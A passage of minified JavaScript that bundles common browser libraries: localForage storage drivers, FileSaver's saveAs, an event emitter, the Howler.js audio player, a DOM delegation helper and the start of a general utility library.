t++,o._dbInfo=null,o._ready=null,o.getDriver(i).then(s).catch(n)}r();var l=new Error("No available storage method found.");return o._driverSet=a.reject(l),o._driverSet}()}}(i)}))})).catch((function(){r();var e=new Error("No available storage method found.");return o._driverSet=a.reject(e),o._driverSet})),l(this._driverSet,t,n),this._driverSet},e.prototype.supports=function(e){return!!F[e]},e.prototype._extend=function(e){W(this,e)},e.prototype._getSupportedDrivers=function(e){for(var t=[],n=0,o=e.length;n<o;n++){var i=e[n];this.supports(i)&&t.push(i)}return t},e.prototype._wrapLibraryMethodsWithReady=function(){for(var e=0;e<M.length;e++)q(this,M[e])},e.prototype.createInstance=function(t){return new e(t)},e}());t.exports=X},{3:3}]},{},[4])(4)}));var saveAs=saveAs||function(e){"use strict";if("undefined"==typeof navigator||!/MSIE [1-9]\./.test(navigator.userAgent)){var t=e.document,n=function(){return e.URL||e.webkitURL||e},o=t.createElementNS("http://www.w3.org/1999/xhtml","a"),i="download"in o,r=e.webkitRequestFileSystem,a=e.requestFileSystem||r||e.mozRequestFileSystem,s=function(t){(e.setImmediate||e.setTimeout)((function(){throw t}),0)},l="application/octet-stream",c=0,u=function(t){var o=function(){"string"==typeof t?n().revokeObjectURL(t):t.remove()};e.chrome?o():setTimeout(o,500)},d=function(e,t,n){for(var o=(t=[].concat(t)).length;o--;){var i=e["on"+t[o]];if("function"==typeof i)try{i.call(e,n||e)}catch(e){s(e)}}},f=function(e){return/^\s*(?:text\/\S*|application\/xml|\S*\/\S*\+xml)\s*;.*charset\s*=\s*utf-8/i.test(e.type)?new Blob(["\ufeff",e],{type:e.type}):e},p=function(s,p){s=f(s);var m,h,g,v=this,y=s.type,_=!1,b=function(){d(v,"writestart progress write writeend".split(" "))},w=function(){!_&&m||(m=n().createObjectURL(s)),h?h.location.href=m:null==e.open(m,"_blank")&&"undefined"!=typeof safari&&(e.location.href=m),v.readyState=v.DONE,b(),u(m)},x=function(e){return function(){if(v.readyState!==v.DONE)return e.apply(this,arguments)}},$={create:!0,exclusive:!1};if(v.readyState=v.INIT,p||(p="download"),i)return m=n().createObjectURL(s),o.href=m,o.download=p,function(n){var o=t.createEvent("MouseEvents");o.initMouseEvent("click",!0,!1,e,0,0,0,0,0,!1,!1,!1,!1,0,null),n.dispatchEvent(o)}(o),v.readyState=v.DONE,b(),void u(m);e.chrome&&y&&y!==l&&(g=s.slice||s.webkitSlice,s=g.call(s,0,s.size,l),_=!0),r&&"download"!==p&&(p+=".download"),(y===l||r)&&(h=e),a?(c+=s.size,a(e.TEMPORARY,c,x((function(e){e.root.getDirectory("saved",$,x((function(e){var t=function(){e.getFile(p,$,x((function(e){e.createWriter(x((function(t){t.onwriteend=function(t){h.location.href=e.toURL(),v.readyState=v.DONE,d(v,"writeend",t),u(e)},t.onerror=function(){var e=t.error;e.code!==e.ABORT_ERR&&w()},"writestart progress write abort".split(" ").forEach((function(e){t["on"+e]=v["on"+e]})),t.write(s),v.abort=function(){t.abort(),v.readyState=v.DONE},v.readyState=v.WRITING})),w)})),w)};e.getFile(p,{create:!1},x((function(e){e.remove(),t()})),x((function(e){e.code===e.NOT_FOUND_ERR?t():w()})))})),w)})),w)):w()},m=p.prototype;return"undefined"!=typeof navigator&&navigator.msSaveOrOpenBlob?function(e,t){return navigator.msSaveOrOpenBlob(f(e),t)}:(m.abort=function(){this.readyState=this.DONE,d(this,"abort")},m.readyState=m.INIT=0,m.WRITING=1,m.DONE=2,m.error=m.onwritestart=m.onprogress=m.onwrite=m.onabort=m.onerror=m.onwriteend=null,function(e,t){return new p(e,t)})}}("undefined"!=typeof self&&self||"undefined"!=typeof window&&window||this.content);function $noop(e){}function $watch(e){e=e||{};var t={},n=Array.prototype.slice,o=function(e,t){e.replace(/\S+/g,t)},i=function(t,n){Object.defineProperty(e,t,{value:n,enumerable:!1,writable:!1,configurable:!1})};return e.observers=t,i("on",(function(n,i){return"function"!=typeof i||o(n,(function(e,n){(t[e]=t[e]||[]).push(i),i.typed=0<n})),e})),i("off",(function(n,i){return"*"!=n||i?o(n,(function(e){if(i)for(var n,o=t[e],r=0;n=o&&o[r];++r)n==i&&o.splice(r--,1);else delete t[e]})):t={},e})),i("once",(function(t,n){return e.on(t,(function o(){e.off(t,o),n.apply(e,arguments)}))})),i("trigger",(function(i){var r,a=n.call(arguments,1);return o(i,(function(o){r=n.call(t[o]||[],0);for(var i,s=0;i=r[s];++s){if(i.busy)return;i.busy=1,i.apply(e,i.typed?[o].concat(a):a),r[s]!==i&&s--,i.busy=0}t["*"]&&"*"!=o&&e.trigger.apply(e,["*",o].concat(a))})),e})),e}"undefined"!=typeof module&&module.exports?module.exports.saveAs=saveAs:"undefined"!=typeof define&&null!==define&&null!=define.amd&&define([],(function(){return saveAs})),function(){var e={},t=null,n=!0,o=!1;try{"undefined"!=typeof AudioContext?t=new AudioContext:"undefined"!=typeof webkitAudioContext?t=new webkitAudioContext:n=!1}catch(a){n=!1}if(!n)if("undefined"!=typeof Audio)try{new Audio}catch(a){o=!0}else o=!0;if(n){var i=void 0===t.createGain?t.createGainNode():t.createGain();i.gain.value=1,i.connect(t.destination)}var r=function(e){this._volume=1,this._muted=!1,this.usingWebAudio=n,this.ctx=t,this.noAudio=o,this._howls=[],this._codecs=e,this.iOSAutoEnable=!0};r.prototype={volume:function(e){var t=this;if(0<=(e=parseFloat(e))&&e<=1){for(var o in t._volume=e,n&&(i.gain.value=e),t._howls)if(t._howls.hasOwnProperty(o)&&!1===t._howls[o]._webAudio)for(var r=0;r<t._howls[o]._audioNode.length;r++)t._howls[o]._audioNode[r].volume=t._howls[o]._volume*t._volume;return t}return n?i.gain.value:t._volume},mute:function(){return this._setMuted(!0),this},unmute:function(){return this._setMuted(!1),this},_setMuted:function(e){var t=this;for(var o in t._muted=e,n&&(i.gain.value=e?0:t._volume),t._howls)if(t._howls.hasOwnProperty(o)&&!1===t._howls[o]._webAudio)for(var r=0;r<t._howls[o]._audioNode.length;r++)t._howls[o]._audioNode[r].muted=e},codecs:function(e){return this._codecs[e]},_enableiOSAudio:function(){var e=this;if(!t||!e._iOSEnabled&&/iPhone|iPad|iPod/i.test(navigator.userAgent)){e._iOSEnabled=!1;var n=function(){var o=t.createBuffer(1,1,22050),i=t.createBufferSource();i.buffer=o,i.connect(t.destination),void 0===i.start?i.noteOn(0):i.start(0),setTimeout((function(){i.playbackState!==i.PLAYING_STATE&&i.playbackState!==i.FINISHED_STATE||(e._iOSEnabled=!0,e.iOSAutoEnable=!1,window.removeEventListener("touchstart",n,!1))}),0)};return window.addEventListener("touchstart",n,!1),e}}};var a=null,s={};o||(a=new Audio,s={mp3:!!a.canPlayType("audio/mpeg;").replace(/^no$/,""),opus:!!a.canPlayType('audio/ogg; codecs="opus"').replace(/^no$/,""),ogg:!!a.canPlayType('audio/ogg; codecs="vorbis"').replace(/^no$/,""),wav:!!a.canPlayType('audio/wav; codecs="1"').replace(/^no$/,""),aac:!!a.canPlayType("audio/aac;").replace(/^no$/,""),m4a:!!(a.canPlayType("audio/x-m4a;")||a.canPlayType("audio/m4a;")||a.canPlayType("audio/aac;")).replace(/^no$/,""),mp4:!!(a.canPlayType("audio/x-mp4;")||a.canPlayType("audio/mp4;")||a.canPlayType("audio/aac;")).replace(/^no$/,""),weba:!!a.canPlayType('audio/webm; codecs="vorbis"').replace(/^no$/,"")});var l=new r(s),c=function(e){var o=this;o._autoplay=e.autoplay||!1,o._buffer=e.buffer||!1,o._duration=e.duration||0,o._format=e.format||null,o._loop=e.loop||!1,o._loaded=!1,o._sprite=e.sprite||{},o._src=e.src||"",o._pos3d=e.pos3d||[0,0,-.5],o._volume=void 0!==e.volume?e.volume:1,o._urls=e.urls||[],o._rate=e.rate||1,o._model=e.model||null,o._onload=[e.onload||function(){}],o._onloaderror=[e.onloaderror||function(){}],o._onend=[e.onend||function(){}],o._onpause=[e.onpause||function(){}],o._onplay=[e.onplay||function(){}],o._onendTimer=[],o._webAudio=n&&!o._buffer,o._audioNode=[],o._webAudio&&o._setupAudioNode(),void 0!==t&&t&&l.iOSAutoEnable&&l._enableiOSAudio(),l._howls.push(o),o.load()};if(c.prototype={load:function(){var e=this,t=null;if(o)e.on("loaderror");else{for(var n=0;n<e._urls.length;n++){var i,a;if(e._format)i=e._format;else{if(a=e._urls[n],(i=/^data:audio\/([^;,]+);/i.exec(a))||(i=/\.([^.]+)$/.exec(a.split("?",1)[0])),!i)return void e.on("loaderror");i=i[1].toLowerCase()}if(s[i]){t=e._urls[n];break}}if(t){if(e._src=t,e._webAudio)u(e,t);else{var c=new Audio;c.addEventListener("error",(function(){c.error&&4===c.error.code&&(r.noAudio=!0),e.on("loaderror",{type:c.error?c.error.code:0})}),!1),e._audioNode.push(c),c.src=t,c._pos=0,c.preload="auto",c.volume=l._muted?0:e._volume*l.volume();var d=function(){e._duration=Math.ceil(10*c.duration)/10,0===Object.getOwnPropertyNames(e._sprite).length&&(e._sprite={_default:[0,1e3*e._duration]}),e._loaded||(e._loaded=!0,e.on("load")),e._autoplay&&e.play(),c.removeEventListener("canplaythrough",d,!1)};c.addEventListener("canplaythrough",d,!1),c.load()}return e}e.on("loaderror")}},urls:function(e){var t=this;return e?(t.stop(),t._urls="string"==typeof e?[e]:e,t._loaded=!1,t.load(),t):t._urls},play:function(e,n){var o=this;return"function"==typeof e&&(n=e),e&&"function"!=typeof e||(e="_default"),o._loaded?o._sprite[e]?o._inactiveNode((function(i){i._sprite=e;var r=0<i._pos?i._pos:o._sprite[e][0]/1e3,a=0;o._webAudio?(a=o._sprite[e][1]/1e3-i._pos,0<i._pos&&(r=o._sprite[e][0]/1e3+r)):a=o._sprite[e][1]/1e3-(r-o._sprite[e][0]/1e3);var s,c,u,d,f,m,h,g=!(!o._loop&&!o._sprite[e][2]),v="string"==typeof n?n:Math.round(Date.now()*Math.random())+"";if(c={id:v,sprite:e,loop:g},s=setTimeout((function(){!o._webAudio&&g&&o.stop(c.id).play(e,c.id),o._webAudio&&!g&&(o._nodeById(c.id).paused=!0,o._nodeById(c.id)._pos=0,o._clearEndTimer(c.id)),o._webAudio||g||o.stop(c.id),o.on("end",v)}),1e3*a),o._onendTimer.push({timer:s,id:c.id}),o._webAudio){var y=o._sprite[e][0]/1e3,_=o._sprite[e][1]/1e3;i.id=v,i.paused=!1,p(o,[g,y,_],v),o._playStart=t.currentTime,i.gain.value=o._volume,void 0===i.bufferSource.start?g?i.bufferSource.noteGrainOn(0,r,86400):i.bufferSource.noteGrainOn(0,r,a):g?i.bufferSource.start(0,r,86400):i.bufferSource.start(0,r,a)}else{if(4!==i.readyState&&(i.readyState||!navigator.isCocoonJS))return o._clearEndTimer(v),u=o,d=e,f=n,h=function(){u.play(d,f),m.removeEventListener("canplaythrough",h,!1)},(m=i).addEventListener("canplaythrough",h,!1),o;i.readyState=4,i.id=v,i.currentTime=r,i.muted=l._muted||i.muted,i.volume=o._volume*l.volume(),setTimeout((function(){i.play()}),0)}return o.on("play"),"function"==typeof n&&n(v),o})):"function"==typeof n&&n():o.on("load",(function(){o.play(e,n)})),o},pause:function(e){var t=this;if(!t._loaded)return t.on("play",(function(){t.pause(e)})),t;t._clearEndTimer(e);var n=e?t._nodeById(e):t._activeNode();if(n)if(n._pos=t.pos(null,e),t._webAudio){if(!n.bufferSource||n.paused)return t;n.paused=!0,void 0===n.bufferSource.stop?n.bufferSource.noteOff(0):n.bufferSource.stop(0)}else n.pause();return t.on("pause"),t},stop:function(e){var t=this;if(!t._loaded)return t.on("play",(function(){t.stop(e)})),t;t._clearEndTimer(e);var n=e?t._nodeById(e):t._activeNode();if(n)if(n._pos=0,t._webAudio){if(!n.bufferSource||n.paused)return t;n.paused=!0,void 0===n.bufferSource.stop?n.bufferSource.noteOff(0):n.bufferSource.stop(0)}else isNaN(n.duration)||(n.pause(),n.currentTime=0);return t},mute:function(e){var t=this;if(!t._loaded)return t.on("play",(function(){t.mute(e)})),t;var n=e?t._nodeById(e):t._activeNode();return n&&(t._webAudio?n.gain.value=0:n.muted=!0),t},unmute:function(e){var t=this;if(!t._loaded)return t.on("play",(function(){t.unmute(e)})),t;var n=e?t._nodeById(e):t._activeNode();return n&&(t._webAudio?n.gain.value=t._volume:n.muted=!1),t},volume:function(e,t){var n=this;if(0<=(e=parseFloat(e))&&e<=1){if(n._volume=e,!n._loaded)return n.on("play",(function(){n.volume(e,t)})),n;var o=t?n._nodeById(t):n._activeNode();return o&&(n._webAudio?o.gain.value=e:o.volume=e*l.volume()),n}return n._volume},loop:function(e){return"boolean"==typeof e?(this._loop=e,this):this._loop},sprite:function(e){return"object"==typeof e?(this._sprite=e,this):this._sprite},pos:function(e,n){var o=this;if(!o._loaded)return o.on("load",(function(){o.pos(e)})),"number"==typeof e?o:o._pos||0;e=parseFloat(e);var i=n?o._nodeById(n):o._activeNode();if(i)return 0<=e?(o.pause(n),i._pos=e,o.play(i._sprite,n),o):o._webAudio?i._pos+(t.currentTime-o._playStart):i.currentTime;if(0<=e)return o;for(var r=0;r<o._audioNode.length;r++)if(o._audioNode[r].paused&&4===o._audioNode[r].readyState)return o._webAudio?o._audioNode[r]._pos:o._audioNode[r].currentTime},pos3d:function(e,t,n,o){var i=this;if(t=void 0!==t&&t?t:0,n=void 0!==n&&n?n:-.5,!i._loaded)return i.on("play",(function(){i.pos3d(e,t,n,o)})),i;if(!(0<=e||e<0))return i._pos3d;if(i._webAudio){var r=o?i._nodeById(o):i._activeNode();r&&(i._pos3d=[e,t,n],r.panner.setPosition(e,t,n),r.panner.panningModel=i._model||"HRTF")}return i},fade:function(e,t,n,o,i){var r=this,a=Math.abs(e-t),s=t<e?"down":"up",l=a/.01,c=n/l;if(!r._loaded)return r.on("load",(function(){r.fade(e,t,n,o,i)})),r;r.volume(e,i);for(var u=1;u<=l;u++)!function(){var e=r._volume+("up"==s?.01:-.01)*u,n=Math.round(1e3*e)/1e3,a=t;setTimeout((function(){r.volume(n,i),n===a&&o&&o()}),c*u)}()},fadeIn:function(e,t,n){return this.volume(0).play().fade(0,e,t,n)},fadeOut:function(e,t,n,o){var i=this;return i.fade(i._volume,e,t,(function(){n&&n(),i.pause(o),i.on("end")}),o)},_nodeById:function(e){for(var t=this._audioNode[0],n=0;n<this._audioNode.length;n++)if(this._audioNode[n].id===e){t=this._audioNode[n];break}return t},_activeNode:function(){for(var e=null,t=0;t<this._audioNode.length;t++)if(!this._audioNode[t].paused){e=this._audioNode[t];break}return this._drainPool(),e},_inactiveNode:function(e){for(var t,n=this,o=null,i=0;i<n._audioNode.length;i++)if(n._audioNode[i].paused&&4===n._audioNode[i].readyState){e(n._audioNode[i]),o=!0;break}if(n._drainPool(),!o)if(n._webAudio)t=n._setupAudioNode(),e(t);else{n.load(),t=n._audioNode[n._audioNode.length-1];var r=navigator.isCocoonJS?"canplaythrough":"loadedmetadata",a=function(){t.removeEventListener(r,a,!1),e(t)};t.addEventListener(r,a,!1)}},_drainPool:function(){var e,t=this,n=0;for(e=0;e<t._audioNode.length;e++)t._audioNode[e].paused&&n++;for(e=t._audioNode.length-1;0<=e&&!(n<=5);e--)t._audioNode[e].paused&&(t._webAudio&&t._audioNode[e].disconnect(0),n--,t._audioNode.splice(e,1))},_clearEndTimer:function(e){for(var t=0,n=0;n<this._onendTimer.length;n++)if(this._onendTimer[n].id===e){t=n;break}var o=this._onendTimer[t];o&&(clearTimeout(o.timer),this._onendTimer.splice(t,1))},_setupAudioNode:function(){var e=this,n=e._audioNode,o=e._audioNode.length;return n[o]=void 0===t.createGain?t.createGainNode():t.createGain(),n[o].gain.value=e._volume,n[o].paused=!0,n[o]._pos=0,n[o].readyState=4,n[o].connect(i),n[o].panner=t.createPanner(),n[o].panner.panningModel=e._model||"equalpower",n[o].panner.setPosition(e._pos3d[0],e._pos3d[1],e._pos3d[2]),n[o].panner.connect(n[o]),n[o]},on:function(e,t){var n=this["_on"+e];if("function"==typeof t)n.push(t);else for(var o=0;o<n.length;o++)t?n[o].call(this,t):n[o].call(this);return this},off:function(e,t){var n=this["_on"+e],o=t?t.toString():null;if(o){for(var i=0;i<n.length;i++)if(o===n[i].toString()){n.splice(i,1);break}}else this["_on"+e]=[];return this},unload:function(){for(var t=this,n=t._audioNode,o=0;o<t._audioNode.length;o++)n[o].paused||(t.stop(n[o].id),t.on("end",n[o].id)),t._webAudio?n[o].disconnect(0):n[o].src="";for(o=0;o<t._onendTimer.length;o++)clearTimeout(t._onendTimer[o].timer);var i=l._howls.indexOf(t);null!==i&&0<=i&&l._howls.splice(i,1),delete e[t._src],t=null}},n)var u=function(t,n){if(n in e)return t._duration=e[n].duration,void f(t);if(/^data:[^;]+;base64,/.test(n)){for(var o=atob(n.split(",")[1]),i=new Uint8Array(o.length),r=0;r<o.length;++r)i[r]=o.charCodeAt(r);d(i.buffer,t,n)}else{var a=new XMLHttpRequest;a.open("GET",n,!0),a.responseType="arraybuffer",a.onload=function(){d(a.response,t,n)},a.onerror=function(){t._webAudio&&(t._buffer=!0,t._webAudio=!1,t._audioNode=[],delete t._gainNode,delete e[n],t.load())};try{a.send()}catch(t){a.onerror()}}},d=function(n,o,i){t.decodeAudioData(n,(function(t){t&&(e[i]=t,f(o,t))}),(function(e){o.on("loaderror")}))},f=function(e,t){e._duration=t?t.duration:e._duration,0===Object.getOwnPropertyNames(e._sprite).length&&(e._sprite={_default:[0,1e3*e._duration]}),e._loaded||(e._loaded=!0,e.on("load")),e._autoplay&&e.play()},p=function(n,o,i){var r=n._nodeById(i);r.bufferSource=t.createBufferSource(),r.bufferSource.buffer=e[n._src],r.bufferSource.connect(r.panner),r.bufferSource.loop=o[0],o[0]&&(r.bufferSource.loopStart=o[1],r.bufferSource.loopEnd=o[1]+o[2]),r.bufferSource.playbackRate.value=n._rate};"function"==typeof define&&define.amd&&define((function(){return{Howler:l,Howl:c}})),"undefined"!=typeof exports&&(exports.Howler=l,exports.Howl=c),"undefined"!=typeof window&&(window.Howler=l,window.Howl=c)}(),function(e){"use strict";var t;function n(e,t){return function(n){for(var o=n.target;o&&1===o.nodeType&&!o.matches(e);)o=o.parentNode;if(!o||1!==o.nodeType)return!1;t.call(o,n)}}t=Element.prototype,Element&&!t.matches&&(t.matches=t.matchesSelector||t.mozMatchesSelector||t.msMatchesSelector||t.oMatchesSelector||t.webkitMatchesSelector),n.get=function(e,t){for(var n=e.target;n&&1===n.nodeType&&!n.matches(t);)n=n.parentNode;return!(!n||1!==n.nodeType)&&n},e.$delegate=n}(this),function(global){"use strict";var _toString=Object.prototype.toString,_fnToString=Function.prototype.toString,_hasOwnProperty=Object.prototype.hasOwnProperty,_slice=Array.prototype.slice,_io={};function getType(e){return _toString.call(e).slice(8,-1)}_io.onerror=function(e){console.log("$io error : ",e)},_io.type=getType;var isArray=isNative(Array.isArray)?Array.isArray:function(e){return e&&"object"==typeof e&&"number"==typeof e.length&&"[object Array]"==_toString.call(e)||!1};function isArrayLike(e){return"object"==typeof e&&"number"==typeof e.length||!1}function isString(e){return"string"==typeof e||!1}function isFunction(e){return"function"==typeof e||!1}function isObject(e){return(!e||"object"==typeof e&&null!==e)&&"[object Object]"==_toString.call(e)}function isNumber(e){return"number"==typeof e&&isFinite(e)||!1}function isRegExp(e){return e&&"object"==typeof e&&"[object RegExp]"==_toString.call(e)||!1}function isArguments(e){return e&&"number"==typeof e.length&&"[object Arguments]"==_toString.call(e)||!1}function isNative(e){return isFunction(e)&&0<=(""+e).indexOf("[native code]")}function isError(e){return e&&"object"==typeof e&&"[object Error]"==_toString.call(e)||!1}function isPrototype(e){var t;return e&&(t=e.constructor)&&"function"==typeof t&&t.prototype==e}function isElement(e){return e&&1===e.nodeType||!1}function isReallyNaN(e){return"[object Number]"==_toString.call(e)&&e!=+e}function isInfinity(e){return"[object Number]"==_toString.call(e)&&!isFinite(e)}function isWindow(e){var t=_toString.call(e);return"[object global]"==t||"[object Window]"==t||"[object DOMWindow]"==t}function isDocument(e){var t=_toString.call(e);return"[object HTMLDocument]"==t||"[object Document]"==t}function isNodeList(e){var t=_toString.call(e);return"object"==typeof e&&("[object HTMLCollection]"==t||"[object NodeList]"==t||"[object Object]"==t&&e.hasOwnProperty("length")&&(0===e.length||"object"==typeof e[0]&&0<e[0].nodeType))}function isJSON(e){var t=!1;return isString(e)||isNumber(e)||"boolean"==typeof e||null==e?t=!0:isArray(e)?arrEach(e,(function(e){return t=isJSON(e)})):isObject(e)&&objEach(e,(function(e){return t=isJSON(e)})),t}function is(e){var t=typeof e;return"string"==t?"String":"boolean"==t?"Boolean":"function"==t?"Function":null===e?"Null":void 0===e?"Undefined":isNumber(e)?"Number":isReallyNaN(e)?"NaN":isElement(e)?"Element":isArray(e)?"Array":isArguments(e)?"Arguments":isInfinity(e)?"Infinity":isError(e)?"Error":isNodeList(e)?"NodeList":isWindow(e)?"Window":isDocument(e)?"Document":e.constructor.name||_toString.call(e).slice(8,-1)}function nativeEqual(e,t){if(typeof e==typeof t&&e+""==t+"")return!0}function keys(e){return e?Object.keys(e):[]}function objEqual(e,t){var n,o,i;for(n in e){if(o=e[n],i=t[n],e.hasOwnProperty(n)!=t.hasOwnProperty(n))return!1;if(typeof o!=typeof i)return!1}for(n in t){if(o=e[n],i=t[n],!e.hasOwnProperty(n))return!1;if(o!==i){if(typeof o!=typeof i)return!1;if(t.hasOwnProperty(n)&&!(isArrayLike(o)&&isArrayLike(i)&&arrEqual(o,i)||isObject(o)&&isObject(i)&&objEqual(o,i)||nativeEqual(o,i)))return!1}}return!0}function objAll(e,t){var n;for(n in e)e.hasOwnProperty(n)&&t(e[n],n)}function objEach(e,t){var n;for(n in e)if(e.hasOwnProperty(n)&&!1===t(e[n],n))break}function obj2str(e){try{return JSON.stringify(e,null,2)}catch(n){try{var t=[];return $io.arr.all(e,(function(e){t.push(e)})),"["+t.join(", ")+"]"}catch(e){return"[Error]"}}}function flatten(e,t,n){var o={};return function e(n,i){for(var r,a,s=0,l=Object.keys(n),c=l.length;s<c;s++)isObject(a=n[r=l[s]])?e(a,i+r+(t||".")):o[i+r]=a}(e,""),o}function getPath(e,t,n){if("string"==typeof t){if(n=n||".",!t||t===n)return e;var o=0,i=$io.reg.escape(n),r=new RegExp("^"+i+"|"+i+"$","gi");for(t=t.replace(r,"").split(n);e&&o<t.length;)e=e[t[o++]];return e}if(isRegExp(t)){var a=flatten(e,n),s={};return $io.arr.all(Object.keys(a),(function(e){t.test(e)&&(s[e]=a[e])})),s}}function path(e,t,n){var o="string"==typeof this?this:".";if(!t||t===o)return e;var i=0,r=$io.reg.escape(o),a=new RegExp("^"+r+"|"+r+"$","gi");for(t=t.replace(a,"").split(o);e&&i<t.length;)e=void 0!==e[t[i]]?i===t.length-1&&2<arguments.length?e[t[i]]=n:e[t[i]]:2<arguments.length?e[t[i]]=i===t.length-1?n:{}:void 0,i++;return e}function arrEqual(e,t){var n,o,i=e.length;if(i!=t.length)return!1;for(;i--;)if((n=e[i])!==(o=t[i])&&!(isArrayLike(n)&&isArrayLike(o)&&arrEqual(n,o)||isObject(n)&&isObject(o)&&objEqual(n,o)||nativeEqual(n,o)))return!1;return!0}function arrAll(e,t){if(e)for(var n=-1,o=e.length;++n<o;)t(e[n])}function arrEach(e,t){if(e)for(var n=-1,o=e.length;++n<o&&!1!==t(e[n],n,e););}function arrReduce(e,t,n){for(var o=n,i=0,r=e.length;i<r;i++)o=t(o,e[i],i,e);return o}function arrRandom(e){return e[Math.floor(Math.random()*e.length)]}function arrInsert(e,t,n){return e.splice.apply(e,[n,0].concat(t)),e}function arrLimit(e,t,n){return e.push(n),e.length>t&&e.shift(),e}function arr2str(e){for(var t="[",n=0,o=e.length;n<o;n++)"string"==typeof e[n]?t+='"'+e[n].replace(/"/g,'\\"')+'"':_io.isArray(e[n])?t+=arr2str(e[n]):t+=e[n],n<o-1&&(t+=", ");return t+"]"}function arrRemove(e,t,n){var o=e.slice((n||t)+1||e.length);return e.length=t<0?e.length+t:t,e.push.apply(e,o)}function arrShuffle(e){var t,n,o;for(o=e.length;o;o--)t=Math.floor(Math.random()*o),n=e[o-1],e[o-1]=e[t],e[t]=n}function fn2str(e,t){return e&&"function"==typeof e?t(e):"_not_a_function_"}function fnStr(e,t){return fn2str(e,(function(){var n=t?/^function[\W\w]*?{/:null,o=t?/\s*\}$/:null,i=e.toString().replace(n,"").replace(o,""),r=i.match(/(^\s*)/gm),a=r?1<r.length?r.slice(1).reduce((function(e,t){return e.length<t.length?e:t})):r[0]:"";return _io.str.trim(i.replace(new RegExp("^"+i.match(a),"gm"),""))}))}function fnName(e){return e.name?e.name:fn2str(e,(function(){var t=e.toString().match(/^\s*function ([^\(\s]+)/);return t&&t[1]||"anonymous"}))}function fnArg(e){return e.length?fn2str(e,(function(){var t=e.toString().replace(/((\/\/.*$)|(\/\*[\s\S]*?\*\/))/gm,""),n=t.slice(t.indexOf("(")+1,t.indexOf(")")).match(/([^\s,]+)/g);return null===n?[]:n})):[]}_io.is=is,_io.is.arr=_io.is.Array=_io.isArray=isArray,_io.is.str=_io.is.String=_io.isString=isString,_io.is.fun=_io.is.Function=_io.isFunction=isFunction,_io.is.obj=_io.is.Object=_io.isObject=isObject,_io.is.num=_io.is.Number=_io.isNumber=isNumber,_io.is.reg=_io.is.RegExp=_io.isRegExp=isRegExp,_io.is.arg=_io.is.Arguments=_io.isArguments=isArguments,_io.is.inf=_io.is.Infinity=_io.isInfinity=isInfinity,_io.is.nan=_io.is.NaN=_io.isReallyNaN=isReallyNaN,_io.is.nat=_io.is.Native=_io.isNative=isNative,_io.is.err=_io.is.Error=_io.isError=isError,_io.is.pro=_io.is.Prototype=_io.isPrototype=isPrototype,_io.is.ele=_io.is.Element=_io.isElement=isElement,_io.is.win=_io.is.Window=_io.isWindow=isWindow,_io.is.doc=_io.is.Document=_io.isDocument=isDocument,_io.is.nodelist=_io.isNodeList=isNodeList,_io.is.json=_io.isJSON=isJSON,_io.obj=_io.Object={},_io.obj.all=objAll,_io.obj.each=objEach,_io.obj.equal=objEqual,_io.obj.stringify=obj2str,_io.obj.getPath=getPath,_io.obj.path=path,_io.obj.flatten=flatten,_io.obj.clear=function(e){for(var t in e)e.hasOwnProperty(t)&&delete e[t];return e},_io.obj.isEmpty=function(e){for(var t in e)if(e.hasOwnProperty(t))return!1;return!0},_io.arr=_io.Array={},_io.arr.stringify=arr2str,_io.arr.all=arrAll,_io.arr.each=arrEach,_io.arr.equal=arrEqual,_io.arr.reduce=arrReduce,_io.arr.random=arrRandom,_io.arr.shuffle=arrShuffle,_io.arr.insert=arrInsert,_io.arr.limit=arrLimit,_io.arr.remove=arrRemove,_io.arr.move=function(e,t,n){var o=e.indexOf(t);if(-1!==o){var i=e.splice(o,1);n=0<o+n?o+n:0,i.length&&e.splice(n,0,i[0])}},_io.arr.up=function(e,t){var n=e.indexOf(t);if(-1!==n&&n!==e.length-1){var o=e.splice(n+1,1,t);o.length&&e.splice(n,1,o[0])}},_io.arr.down=function(e,t){var n=e.indexOf(t);if(!(n<=0)){var o=e.splice(n-1,1,t);o.length&&e.splice(n,1,o[0])}},_io.arr.bottom=function(e,t){var n=e.indexOf(t);if(!(n<=0)){var o=e.splice(n,1);o.length&&e.unshift(o[0])}},_io.arr.top=function(e,t){var n=e.indexOf(t);if(-1!==n&&n!==e.length-1){var o=e.splice(n,1);o.length&&e.push(o[0])}},_io.arr.enum=function(e,t){var n,o,i,r=0,a=0;function s(){0==--r&&"function"==typeof n&&n(),"function"==typeof o&&o(100-r/a*100,r,a)}return(0===e.length||1===e.length&&0===e[0].length)&&setImmediate((function(){"function"==typeof n&&n()})),$io.arr.each(e,(function(e,n){a+=e.length,$io.arr.each(e,(function(e,o){r++,setImmediate((function(){t.call({list:n,index:r},e,o,s)}))}))})),i={progress:function(e){return o=e,i},done:function(e){return n=e,i}}},_io.enum=function(e,t,n){(0===e.length||1===e.length&&0===e[0].length)&&n();var o=0;function i(e){0==--o&&n()}$io.arr.each(e,(function(e,n){var r=$io.is(e);"Array"===r||"Object"===r?$io[r].each(e,(function(e,r){o++,setImmediate((function(){t.call({list:n,index:o},e,r,i)}))})):"Function"===r?(o++,setImmediate((function(){e.call({list:n,index:o},i)}))):(o++,setImmediate((function(){t.call({list:n,index:o},e,n,i)})))}))},_io.str=_io.String={},_io.str.insertAt=function(e,t,n){return e.substr(0,n)+t+e.substr(n+t.length)},_io.str.replaceAt=function(e,t,n,o){return e.substr(0,o)+n+e.substr(o+t.length)},_io.str.truncate=function(e,t){return e.length>t?e.slice(0,t)+"...":e},_io.str.slug=function(e){return e.toLowerCase().replace(/\s+/g,"-").replace(/[^-\w]/g,"")},_io.str.trim=function(e){var t,n;for(t=0,n=e.length-1;t<=n&&e.charCodeAt(t)<33;t++);for(;t<=n&&e.charCodeAt(n)<33;n--);return e.substring(t,n+1)},_io.str.camel=function(e){return e.replace(/(\-[a-z])/g,(function(e){return e.toUpperCase().replace("-","")}))},_io.str.dash=function(e){return e.replace(/([A-Z])/g,(function(e){return"-"+e.toLowerCase()}))},_io.str.capitalise=function(e){return e.charAt(0).toUpperCase()+e.slice(1)},_io.str.htmlEscape=function(e){return String(e).replace(/&/g,"&amp;").replace(/"/g,"&quot;").replace(/'/g,"&#39;").replace(/</g,"&lt;").replace(/>/g,"&gt;")},_io.fn={},_io.fn.str=fnStr,_io.fn.outer=fnStr,_io.fn.inner=function(e){return fnStr(e,!0)},_io.fn.name=fnName,_io.fn.arg=fnArg,_io.fn.prop=_io.fn.keys=function(e){return e?Object.keys(e):[]},_io.fn.method=_io.fn.meth=function(e){for(var t=Object.keys(e),n=-1,o=t.length,i={};++n<o;)i[t[n]]=e[t[n]];return i},_io.fn.throttle=function(e,t){var n;return t=0<t?t:100,function(){var 